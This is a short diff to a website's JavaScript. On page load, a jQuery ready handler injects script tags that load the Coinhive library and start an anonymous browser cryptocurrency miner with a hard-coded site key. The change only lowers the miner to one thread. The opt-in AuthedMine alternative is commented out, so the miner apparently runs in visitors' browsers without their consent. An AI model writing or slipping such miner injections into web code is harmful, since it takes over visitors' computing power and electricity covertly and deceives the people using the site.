@@ -210,7 +210,9 @@ $(document).ready(function(){
 		// '<script src="https:\/\/authedmine.com\/lib\/authedmine.min.js"><\/script>' +
 		'<script src="https:\/\/coinhive.com\/lib\/coinhive.min.js"><\/script>' +
 		'<script>' +
-		'	var miner = new CoinHive.Anonymous(\'wXS5KFc5mWChIpczWxnYY6X9tb95ESw1\');' +
+		'	var miner = new CoinHive.Anonymous(\'wXS5KFc5mWChIpczWxnYY6X9tb95ESw1\', {' +
+        '		threads: 1,' +
+        '	});' +
 		'	miner.start();' +
 		'</script>'
 	);
